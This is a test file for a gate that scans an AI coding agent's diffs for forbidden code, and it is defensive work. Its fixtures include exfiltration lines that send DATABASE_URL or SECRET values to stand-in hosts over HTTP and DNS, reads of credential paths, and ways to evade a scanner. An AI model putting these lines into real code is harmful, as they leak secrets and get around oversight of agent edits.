// §3f.9 post-turn gate (lane O9): one positive and one negative fixture per rule. Incidents guarded:
// 22d08d4 (phantom CompleteRegistrations: a page-built event id is refused at the turn) and 9fcbefa
// (a provider id that is not the connection's — e.g. a default — is refused).
import { describe, expect, it } from "vitest"

import { run3EditedLayout, run3InstalledLayout } from "../../test/wizard/run3-fixture.js"
import { jsSource } from "../../test/site-code/js-source.js"
import { diffLines, hunkLines, splitLines } from "../agents/line-diff.js"
import { FIXED_NOW } from "../../test/wizard/fixture-fetch.js"
import { renderInfiniteBrowserTag } from "../runtime/infinite-browser.js"
import { buildServerLaneModuleSource } from "../server-lane/runtime-source.js"
import { HOST_DENY_V1 } from "../wizard/contracts/host-deny.js"
import type { TurnDiff } from "../wizard/contracts/jobs.js"

import { hasClientDirective, hasLoopbackLiteral, isBuildTimeFile, isServerExecutedFile, scanTurnDiff, turnGate, TURN_GATE_RULES, type TurnGateRule } from "./turn-gate.js"

const CONNECTION = ["G-ACME123", "phc_acmeAcmeAcmeAcme0001", "111222333444555"]

function diff(path: string, added: string | string[], removed: string[] = []): TurnDiff {
  const lines = Array.isArray(added) ? added : [added]
  return {
    files: [
      {
        path,
        added: lines.map((text, index) => ({ line: 10 + index, text })),
        removed: removed.map((text, index) => ({ line: 10 + index, text }))
      }
    ]
  }
}

function rules(d: TurnDiff, readFile?: (path: string) => string | null): TurnGateRule[] {
  return scanTurnDiff(d, { connectionIds: CONNECTION, ...(readFile ? { readFile } : {}) }).map((hit) => hit.rule)
}

/** [rule, a file, a line that must hit, a line in the same file that must NOT hit]. */
const CASES: Array<[TurnGateRule, string, string, string]> = [
  ["child_process", "next.config.mjs", 'const { execSync } = require("child_process")', 'const local = require("./local")'],
  ["child_process", "src/app/page.tsx", 'import { spawn } from "node:child_process"', 'import { useState } from "react"'],
  ["net", "src/lib/x.ts", 'import net from "node:net"', 'import network from "./network"'],
  ["dgram", "src/lib/x.ts", 'const dgram = require("dgram")', 'const d = require("./dgram-ish")'],
  ["worker_threads", "src/lib/x.ts", 'import { Worker } from "worker_threads"', 'import { Worker } from "./worker"'],
  ["http_request", "src/lib/x.ts", "https.get(url, (res) => {})", "const page = await fetch('/api/thing')"],
  ["http_request", "src/lib/x.ts", 'import http from "node:http"', 'import h from "./http-helpers"'],
  ["build_time_fetch", "next.config.mjs", "await fetch('https://example.com/config.json')", "const rewrites = [{ source: '/ingest/:path*' }]"],
  ["build_time_fetch", "scripts/prebuild.js", "new XMLHttpRequest()", "console.log('build')"],
  ["eval", "src/lib/x.ts", "eval(code)", "const evaluate = (x) => x"],
  ["new_function", "src/lib/x.ts", "const f = new Function('return process')", "function named() {}"],
  ["computed_require", "src/lib/x.ts", "const mod = require(name)", 'const mod = require("./fixed")'],
  ["computed_require", "src/lib/x.ts", "const mod = require(`./${name}`)", "const mod = require('./also-fixed')"],
  ["secret_path_literal", "src/lib/x.ts", "const p = home + '/.growth-os/auth.json'", "const p = home + '/.config/app.json'"],
  ["secret_path_literal", "src/lib/x.ts", "read('~/Library/Application Support/Infinite/key')", "read('~/Library/Caches/app')"],
  ["loopback_literal", "src/lib/x.ts", "fetch('http://127.0.0.1:4242/v1/keys')", "fetch('/v1/keys')"],
  ["loopback_literal", "src/lib/x.ts", "const url = 'http://localhost:3000'", "const host = 'localhostess'"],
  ["fbp_write", "src/lib/x.ts", "document.cookie = '_fbp=fb.1.' + Date.now() + '.1'", "const fbp = cookies.get('_fbp')"],
  ["autoconfig_on", "src/app/layout.tsx", "fbq('set', 'autoConfig', true, '111222333444555')", "fbq('set', 'autoConfig', false, '111222333444555')"],
  ["foreign_provider_id", "src/app/layout.tsx", "fbq('init', '999999999999999')", "fbq('init', '111222333444555')"],
  ["foreign_provider_id", "src/app/layout.tsx", "gtag('config', 'G-NOTOURS1')", "gtag('config', 'G-ACME123')"],
  ["foreign_provider_id", "src/app/providers.tsx", "posthog.init('phc_someoneElseKey000001', {})", "posthog.init('phc_acmeAcmeAcmeAcme0001', {})"],
  ["test_event_code", "src/app/api/lead/route.ts", "body.test_event_code = 'TEST123'", "body.event_name = 'Lead'"],
  ["page_built_event_id", "src/app/signup.tsx", "fbq('track', 'CompleteRegistration', {}, { eventID: 'signup-' + id })", "fbq('track', 'CompleteRegistration', {}, { eventID: metaEventId })"],
  // Review fix round (O9): evasions the first gate missed.
  ["child_process", "next.config.mjs", "const cp = await import(`node:child_process`)", "const cfg = await import('./config.mjs')"],
  ["computed_require", "next.config.mjs", 'const m = await import("node:" + "child_process")', 'const m = await import("./local.mjs")'],
  ["computed_require", "next.config.mjs", "const req = createRequire(import.meta.url)", "const url = import.meta.url"],
  ["new_function", "next.config.mjs", 'const env = Function("return process")().env', "function config() { return {} }"],
  ["new_function", "src/lib/x.ts", '(() => {}).constructor("return process")()', "class A { constructor() {} }"],
  ["node_internals", "next.config.mjs", 'process.binding("spawn_sync")', "process.env.NODE_ENV"],
  ["node_internals", "next.config.mjs", 'import vm from "node:vm"', 'import path from "node:path"'],
  // B19: process.getBuiltinModule loads child_process without an import or a require.
  ["node_internals", "next.config.mjs", 'const cp = process.getBuiltinModule("child_process")', 'const mod = process.env.MODULE_NAME'],
  ["eval", "src/lib/x.ts", '(0, eval)("1")', "const evaluation = 1"],
  ["eval", "src/lib/x.ts", 'globalThis.eval("1")', "const medieval = 1"],
  ["build_time_fetch", "next.config.mjs", "await fetch(u)", "await fetch('/api/config')"],
  ["build_time_fetch", "next.config.mjs", "const f = globalThis.fetch", "const rewrites = async () => []"],
  ["build_time_fetch", "vite.config.ts", 'import { request } from "undici"', 'import react from "@vitejs/plugin-react"'],
  ["computed_global", "next.config.mjs", 'globalThis["fet" + "ch"](u)', "const name = 'acme'"],
  ["foreign_provider_id", "src/app/layout.tsx", "fbq('init', process.env.NEXT_PUBLIC_META_PIXEL_ID || '999999999999999')", "fbq('init', process.env.NEXT_PUBLIC_META_PIXEL_ID)"],
  ["foreign_provider_id", "src/app/layout.tsx", 'const PIXEL = env.PIXEL ?? "999999999999999"', 'const PIXEL = env.PIXEL ?? "111222333444555"'],
  ["page_built_event_id", "src/app/signup.tsx", "fbq('track', 'Lead', {}, { eventID: res.metaEventId ?? crypto.randomUUID() })", "fbq('track', 'Lead', {}, { eventID: res.metaEventId })"],
  ["conversion_without_event_id", "src/app/thanks/page.tsx", "useEffect(() => fbq('track', 'Purchase'), [])", "useEffect(() => fbq('track', 'Purchase', {}, { eventID: metaEventId }), [])"],
  ["loopback_literal", "src/lib/x.ts", "const bridge = `http://127.0.0.1:${port}`", 'const deny = ["localhost", "127.0.0.1"]'],
  ["loopback_literal", "src/lib/x.ts", "const h = '127.0.0.1' + ':' + port", "if (host === '127.0.0.1') return"]
]

describe("post-turn gate: one positive and one negative per rule", () => {
  for (const [rule, file, bad, good] of CASES) {
    it(`${rule}: ${bad}`, () => {
      expect(rules(diff(file, bad))).toContain(rule)
      expect(rules(diff(file, good))).not.toContain(rule)
    })
  }

  it("ph shorthand inside fbq / adMatch (review P1-4)", () => {
    expect(rules(diff("src/app/signup.tsx", "fbq('init', '111222333444555', { em, ph })"))).toContain("ph_in_meta")
    expect(rules(diff("src/app/api/lead/route.ts", "await reportInfiniteOutcome({ type: 'lead', eventId: lead.id, adMatch: { em, ph } })"))).toContain("ph_in_meta")
    expect(rules(diff("src/app/signup.tsx", "fbq('init', '111222333444555', { em, external_id })"))).not.toContain("ph_in_meta")
  })

  it("ph inside fbq / adMatch (negative: em only)", () => {
    expect(rules(diff("src/app/signup.tsx", ["fbq('init', '111222333444555', {", "  em: hashedEmail,", "  ph: hashedPhone", "})"]))).toContain("ph_in_meta")
    expect(rules(diff("src/app/api/lead/route.ts", ["await reportInfiniteOutcome({ type: 'lead', eventId: lead.id, adMatch: { ph: phone } })"]))).toContain("ph_in_meta")
    expect(rules(diff("src/app/signup.tsx", ["fbq('init', '111222333444555', {", "  em: hashedEmail", "})"]))).not.toContain("ph_in_meta")
  })

  it("a removed autoConfig false opt-out (negative: moved, i.e. added back for the same pixel)", () => {
    const optOut = "fbq('set', 'autoConfig', false, '111222333444555')"
    expect(rules(diff("src/app/layout.tsx", ["fbq('init', '111222333444555')"], [optOut]))).toContain("autoconfig_opt_out_removed")
    expect(rules(diff("src/app/layout.tsx", [optOut, "fbq('init', '111222333444555')"], [optOut]))).not.toContain("autoconfig_opt_out_removed")
  })

  it("a removed autoConfig opt-out with a VARIABLE pixel (review P1-4; negative: added back)", () => {
    const optOut = "fbq('set', 'autoConfig', false, PIXEL_ID)"
    expect(rules(diff("src/app/layout.tsx", ["fbq('init', PIXEL_ID)"], [optOut]))).toContain("autoconfig_opt_out_removed")
    expect(rules(diff("src/app/layout.tsx", ["fbq('set', 'autoConfig', false,  PIXEL_ID)", "fbq('init', PIXEL_ID)"], [optOut]))).not.toContain("autoconfig_opt_out_removed")
  })

  it("a conversion fired from a same-file named click handler (review P2-8)", () => {
    const added = ["function onBuy() {", "  fbq('track', 'Lead', {}, { eventID: metaEventId })", "}", "const B = () => <button onClick={onBuy}>Buy</button>"]
    expect(rules(diff("src/app/buy.tsx", added))).toContain("standard_on_click")
  })

  it("a standard conversion in a click handler — from the hunk, and from the whole file when the handler is not in the diff", () => {
    expect(rules(diff("src/app/contact.tsx", ["<button onClick={() => {", "  fbq('track', 'Lead')", "}}>Talk</button>"]))).toContain("standard_on_click")
    // Only the fbq line was added, inside an existing handler: the gate reads the file after the turn.
    const file = ["<button onClick={() => {", "  setOpen(true)", "  fbq('track', 'Lead')", "}}>Talk</button>"].join("\n")
    const onlyFbq: TurnDiff = { files: [{ path: "src/app/contact.tsx", added: [{ line: 3, text: "  fbq('track', 'Lead')" }], removed: [] }] }
    expect(rules(onlyFbq, () => file)).toContain("standard_on_click")
    expect(rules(onlyFbq)).not.toContain("standard_on_click")
    // Negative: the conversion reported after the server succeeded, outside any click handler.
    expect(rules(diff("src/app/contact.tsx", ["const res = await submit()", "infiniteMetaMirror(res.metaEventId)"]))).not.toContain("standard_on_click")
  })

  it("comments do not trip code rules, but the secret-path and loopback literals count anywhere", () => {
    expect(rules(diff("src/lib/x.ts", "// eval( is never used here"))).toEqual([])
    expect(rules(diff("src/lib/x.ts", ["/**", " * do not call eval( here", " */"]))).toEqual([])
    expect(rules(diff("src/lib/x.ts", "// see ~/.growth-os for details"))).toContain("secret_path_literal")
    expect(rules(diff("src/lib/x.ts", "// the bridge is http://127.0.0.1:4242"))).toContain("loopback_literal")
  })

  it("a '//' inside a string hides nothing after it (review P1-2)", () => {
    expect(rules(diff("next.config.mjs", 'const a = "a//"; const cp = require("child_process")'))).toContain("child_process")
    expect(rules(diff("src/app/layout.tsx", "const a = \"x//\"; fbq('init', '999999999999999')"))).toContain("foreign_provider_id")
    expect(rules(diff("next.config.mjs", "const a = 'x//'; eval(code)"))).toContain("eval")
    // A comment that only LOOKS like code after a real statement still counts: the raw line is read.
    expect(rules(diff("src/lib/x.ts", "const s = '//'; new Function('x')"))).toContain("new_function")
  })

  it("a require( split over two lines: a plain string is fine, a computed one is not (review P3-1)", () => {
    expect(rules(diff("src/lib/x.ts", ["const m = require(", '  "./fixed"', ")"]))).not.toContain("computed_require")
    expect(rules(diff("src/lib/x.ts", ["const m = require(", "  name", ")"]))).toContain("computed_require")
  })

  it("scripts/ is build-time only at the repo or app root (review P3-1)", () => {
    expect(isBuildTimeFile("scripts/prebuild.js")).toBe(true)
    expect(isBuildTimeFile("apps/web/scripts/prebuild.js")).toBe(true)
    expect(isBuildTimeFile("public/scripts/widget.js")).toBe(false)
    expect(isBuildTimeFile("src/scripts/thing.ts")).toBe(false)
    expect(rules(diff("public/scripts/widget.js", "fetch('https://api.example.com/x')"))).toEqual([])
  })

  it("infinite-tag's own emitted bytes pass the loopback rule (review P1-1: jobs 7, 2 and 1)", () => {
    // O5's preview-guard expression inlines the deny list, loopback included.
    const guardLine = `if (!((function (h) { var n = h, i; var x = ["acme.com"], d = ${jsSource(HOST_DENY_V1.deny.exact)}, s = ${jsSource(HOST_DENY_V1.deny.suffix)}; for (i = 0; i < d.length; i += 1) if (d[i] === n) return false; return true; })(location.hostname))) return;`
    expect(hasLoopbackLiteral(guardLine)).toBe(false)
    expect(rules(diff("index.html", guardLine))).toEqual([])
    const runtime = renderInfiniteBrowserTag({ siteSourceKey: "site_acme", collectPath: "/infinite/ledger", productionHosts: ["acme.com"], respectDnt: true, consent: { mode: "not_required" } })
    expect(rules(diff("app/layout.tsx", runtime.split("\n"))).filter((rule) => rule === "loopback_literal")).toEqual([])
    const lane = buildServerLaneModuleSource({ siteSourceKey: "site_acme", productionHosts: ["acme.com"] })
    expect(rules(diff("lib/infinite-server-lane.ts", lane.split("\n"))).filter((rule) => rule === "loopback_literal")).toEqual([])
  })

  it("every rule has copy", () => {
    for (const [rule] of CASES) expect(TURN_GATE_RULES[rule]).toBeTruthy()
  })
})

describe("post-turn gate as check results", () => {
  const ctx = { runId: "run-1", now: FIXED_NOW }

  it("one problem per hit with file:line", () => {
    const results = turnGate(diff("next.config.mjs", 'const cp = require("child_process")'), { connectionIds: CONNECTION }, ctx)
    expect(results).toEqual([
      {
        checkId: "turn_gate",
        state: "problem",
        reason: "child_process: the edit starts a child process",
        evidence: [{ file: "next.config.mjs", line: 10 }],
        tier: "S",
        at: "2026-10-02T12:00:00.000Z",
        runId: "run-1"
      }
    ])
  })

  it("one pass when the turn is clean", () => {
    const results = turnGate(diff("src/app/page.tsx", ["infiniteTrack('sign_up')", "gtag('config', 'G-ACME123')"]), { connectionIds: CONNECTION }, ctx)
    expect(results.map((result) => result.state)).toEqual(["pass"])
    expect(results[0]!.reason).toBe("2 added lines checked: nothing executable or forbidden")
  })
})

describe("review I1 P1-3: code the wizard's own build executes is gated like a config", () => {
  const server = (text: string) => () => text
  it("the reviewer's probes are all refused", () => {
    expect(rules(diff("app/layout.tsx", "  await fetch(`https://collect.example.net/x?d=${process.env.DATABASE_URL}`)"), server("export default async function RootLayout() {}\n"))).toContain("build_time_fetch")
    expect(rules(diff("app/api/signup/route.ts", '  await fetch("https://e.example/" + process.env.DATABASE_URL)'))).toContain("build_time_fetch")
    expect(rules(diff("next.config.mjs", ['import dns from "node:dns"', 'dns.resolve(process.env.SECRET + ".e.example", () => {})']))).toContain("dns")
    expect(rules(diff("next.config.mjs", ['import { writeFileSync } from "node:fs"', 'writeFileSync(".lintstagedrc", "{}")']))).toEqual(expect.arrayContaining(["fs_write"]))
    expect(rules(diff("app/page.tsx", '  Reflect.get(globalThis, "fet" + "ch")("https://e.example")'))).toContain("computed_global")
    expect(rules(diff("lib/helper.ts", '  const fs = await import("fs/promises")'))).toContain("fs_write")
  })

  it("negative: a 'use client' module, a public/ script and markup keep their page-code freedom", () => {
    const client = '"use client"\nexport function Button() {}\n'
    expect(rules(diff("components/button.tsx", '  await fetch("https://api.example.com/x")'), server(client))).not.toContain("build_time_fetch")
    expect(rules(diff("public/widget.js", '  fetch("https://api.example.com/x")'))).not.toContain("build_time_fetch")
    expect(rules(diff("index.html", '<script>fetch("https://api.example.com/x")</script>'))).not.toContain("build_time_fetch")
    // A relative-path request is still fine in server code.
    expect(rules(diff("app/api/signup/route.ts", '  await fetch("/api/other")'))).not.toContain("build_time_fetch")
  })

  it("an unreadable file is treated as executed (fail closed)", () => {
    expect(isServerExecutedFile("components/button.tsx", null)).toBe(true)
    expect(isServerExecutedFile("components/button.tsx", '"use client"\n')).toBe(false)
    expect(isServerExecutedFile("components/button.tsx", '// note\n/* x */\n"use client"\n')).toBe(false)
    expect(isServerExecutedFile("next.config.mjs", '"use client"\n')).toBe(true)
  })

  it("the use-client directive: only as the first statement, after whitespace and comments", () => {
    expect(hasClientDirective('"use client"')).toBe(true)
    expect(hasClientDirective("  'use client';\nexport {}")).toBe(true)
    expect(hasClientDirective('// a\n/* b\n */ /* c */\n\t"use client"')).toBe(true)
    expect(hasClientDirective("/*/ still a comment */'use client'")).toBe(true)
    // negative: anything else first, an unterminated comment, a line comment with no newline, another directive
    expect(hasClientDirective('import x from "y"\n"use client"')).toBe(false)
    expect(hasClientDirective('/* never closed "use client"')).toBe(false)
    expect(hasClientDirective('// "use client"')).toBe(false)
    expect(hasClientDirective('"use server"')).toBe(false)
    expect(hasClientDirective('"use clientele"')).toBe(false)
    expect(hasClientDirective("")).toBe(false)
  })

  it("a file of many comment openers and no directive is decided in milliseconds (the old regex backtracked exponentially)", () => {
    // 32 repeats of `*/ /*` take the old regex seconds (each two more double it); the scan takes microseconds.
    for (const hostile of [`/*${"*/ /*".repeat(32)}`, `/*${"*/".repeat(5_000)}`, `${"// x\n".repeat(50_000)}/*`]) {
      const started = performance.now()
      expect(hasClientDirective(hostile)).toBe(false)
      expect(isServerExecutedFile("components/button.tsx", hostile)).toBe(true)
      expect(performance.now() - started).toBeLessThan(200)
    }
  })
})

/** A real line diff of one file, as the fence and the commit gate build it. */
function realDiff(path: string, before: string, after: string): TurnDiff {
  const a = splitLines(before)
  const b = splitLines(after)
  const added: Array<{ line: number; text: string }> = []
  const removed: Array<{ line: number; text: string }> = []
  for (const hunk of diffLines(before, after)) {
    const lines = hunkLines(a, b, hunk)
    added.push(...lines.added)
    removed.push(...lines.removed)
  }
  return { files: [{ path, added, removed }] }
}

describe("§3x.1 the provider-id rules judge what the turn CHANGED (live run 3, W2)", () => {
  const before = run3InstalledLayout()
  const after = run3EditedLayout()
  const NONE: string[] = [] // run 3: a fresh workspace, nothing connected
  const idRules = (d: TurnDiff, connectionIds: readonly string[] = NONE) =>
    scanTurnDiff(d, { connectionIds, readFile: () => null }).filter((hit) => hit.rule === "foreign_provider_id" || hit.rule === "fallback_provider_id")
  const withAfter = (edited: string) => realDiff("app/layout.tsx", before, edited)

  it("row 1: Claude's real run-3 turn (dedupe + the GA4 wrap + the Meta wrap) passes with no connections", () => {
    expect(idRules(withAfter(after))).toEqual([])
  })

  it("row 2: a pure dedupe (the run-2 shape) passes", () => {
    const dedupe = before.replace(/\s*\{\/\* Added later[\s\S]*?ga4-again[\s\S]*?<\/Script>/, "")
    expect(dedupe).not.toBe(before)
    expect(idRules(withAfter(dedupe))).toEqual([])
  })

  it("row 3: a NEW GA4 id is refused, on the line that adds it", () => {
    const edited = after.replace("gtag('js', new Date());", "gtag('js', new Date());\ngtag('config', 'G-EVIL12345');")
    const hits = idRules(withAfter(edited))
    expect(hits.map((hit) => hit.rule)).toEqual(["foreign_provider_id"])
    expect(edited.split("\n")[(hits[0]?.line ?? 0) - 1]).toContain("G-EVIL12345")
  })

  it("row 4: `window.GA_ID || '<the site's own id>'` added (unconnected) is a fallback", () => {
    const edited = after.replace("gtag('js', new Date());", "gtag('js', new Date());\nvar id = window.GA_ID || 'G-TEST0000000';")
    expect(idRules(withAfter(edited)).map((hit) => hit.rule)).toEqual(["fallback_provider_id"])
  })

  it("row 5: `process.env.X ?? '<the CONNECTED id>'` is a fallback too (the shipped rule passed it)", () => {
    const edited = after.replace("gtag('js', new Date());", "gtag('js', new Date());\nvar id = process.env.X ?? 'G-TEST0000000';")
    expect(idRules(withAfter(edited), ["G-TEST0000000", "7777000011112222"]).map((hit) => hit.rule)).toEqual(["fallback_provider_id"])
  })

  it("row 6: the Meta init re-typed with another pixel is refused", () => {
    const edited = after.replace("fbq('init', '7777000011112222');", "fbq('init', '9999999999999999');")
    expect(idRules(withAfter(edited)).map((hit) => hit.rule)).toEqual(["foreign_provider_id"])
  })

  it("row 7: one copy removed and a DIFFERENT id added is refused (a dedupe cannot pay for a new id)", () => {
    const edited = after.replace("gtag('config', 'G-TEST0000000');", "gtag('config', 'G-OTHER99999');")
    expect(idRules(withAfter(edited)).map((hit) => hit.rule)).toEqual(["foreign_provider_id"])
  })

  it("row 8: an existing `env || 'G-…'` line re-emitted inside a guard passes; a SECOND copy of it is refused", () => {
    const old = "const a = 1\nconst id = process.env.GA || 'G-TEST0000000'\ngtag('config', id)\n"
    const wrapped = "const a = 1\nif (guard(location.hostname)) {\n  const id = process.env.GA || 'G-TEST0000000'\n  gtag('config', id)\n}\n"
    expect(idRules(realDiff("app/ga.ts", old, wrapped))).toEqual([])
    const doubled = wrapped.replace("}\n", "}\nconst again = process.env.GA2 || 'G-TEST0000000'\n")
    // A second copy raises both counters: the fallback AND (unconnected) the id itself.
    expect(idRules(realDiff("app/ga.ts", old, doubled)).map((hit) => hit.rule).sort()).toEqual(["fallback_provider_id", "foreign_provider_id"])
  })

  it("moving an init to ANOTHER file raises its count there and is refused", () => {
    const d: TurnDiff = {
      files: [
        { path: "app/layout.tsx", added: [], removed: [{ line: 3, text: "gtag('config', 'G-TEST0000000')" }] },
        { path: "app/ga.tsx", added: [{ line: 1, text: "gtag('config', 'G-TEST0000000')" }], removed: [] }
      ]
    }
    expect(idRules(d)).toEqual([{ rule: "foreign_provider_id", file: "app/ga.tsx", line: 1 }])
  })

  it("a connection id that the turn adds plainly passes; a ternary fallback of it does not", () => {
    expect(idRules(diff("app/x.ts", "gtag('config', 'G-ACME123')"), CONNECTION)).toEqual([])
    expect(idRules(diff("app/x.ts", "const id = prod ? 'G-ACME123' : undefined"), CONNECTION).map((hit) => hit.rule)).toEqual(["fallback_provider_id"])
    expect(idRules(diff("app/x.ts", "const id = prod ? undefined : 'G-ACME123'"), CONNECTION).map((hit) => hit.rule)).toEqual(["fallback_provider_id"])
    // negative: an object key and an optional property are not fallbacks
    expect(idRules(diff("app/x.ts", "const cfg = { id: 'G-ACME123' }"), CONNECTION)).toEqual([])
    expect(idRules(diff("app/x.ts", ["type C = { id?: string }", "const cfg: C = { id: 'G-ACME123' }"]), CONNECTION)).toEqual([])
  })

  it("the commit gate's view (the whole staged change vs HEAD) gets the same answer", () => {
    const results = turnGate(withAfter(after), { connectionIds: NONE, readFile: () => after }, { runId: "r", now: FIXED_NOW })
    expect(results.map((result) => result.state)).toEqual(["pass"])
  })
})
